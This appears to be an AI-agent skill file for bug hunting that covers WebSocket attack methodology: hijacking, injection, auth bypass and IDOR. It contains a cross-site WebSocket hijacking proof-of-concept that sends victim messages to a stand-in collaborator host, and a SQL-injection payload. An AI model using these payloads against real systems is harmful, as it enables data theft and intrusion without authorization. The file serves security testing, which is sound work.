---
skill: websocket
title: "WebSocket Security"
category: "Security · Web"
load_when: "websocket, ws, wss, socket.io, websocket hijacking, cswsh, websocket injection, origin bypass"
pack: SUPERAGENT V10
bughunt: true
---

# WebSocket Security

## Where it pays
WebSockets often skip the authz/validation that HTTP endpoints get — injection, hijacking, and auth bypass live here.

## Attack-surface signals
ws:// or wss:// connections; socket.io; real-time features (chat, notifications, live data); Origin handling in the WS handshake.

## Methodology
1. Intercept the WS handshake + messages (Burp WebSockets / wsrepl).
2. **CSWSH** (Cross-Site WebSocket Hijacking): no Origin check + cookie auth → connect from attacker page, read the victim's stream.
3. Injection through WS messages (SQLi/XSS/command) — often unsanitized vs HTTP.
4. Auth: can you connect without a valid token? Reuse an expired one?
5. Message tampering: change IDs (IDOR over WS), flood/DoS.
6. Missing rate-limit on WS messages.

## Payloads / probes
```
# CSWSH PoC (attacker page)
var ws=new WebSocket('wss://target/socket');
ws.onmessage=e=>fetch('//collab/?'+btoa(e.data));
# message injection
{"action":"query","id":"' OR 1=1--"}
```

## Root causes
No Origin validation on handshake · cookie-only WS auth · messages not re-authorized/validated · IDs trusted from client.

## Validation gate
Show cross-origin hijack reading victim data, or a successful injection/IDOR over the socket.

## Impact & chains
Data theft (CSWSH) · injection → RCE/SQLi · IDOR over WS → cross-user access. Chains with auth/session and web/idor.

## 🧪 Try it locally
```bash
python3 ../../../tools/skill_router.py "websocket, ws, wss, socket.io, websocket hijacking, cswsh, websocket injection, origin bypass"
```

→ Report with `../reporting/writeup.md`; validate with `../reporting/validation-gate.md`.
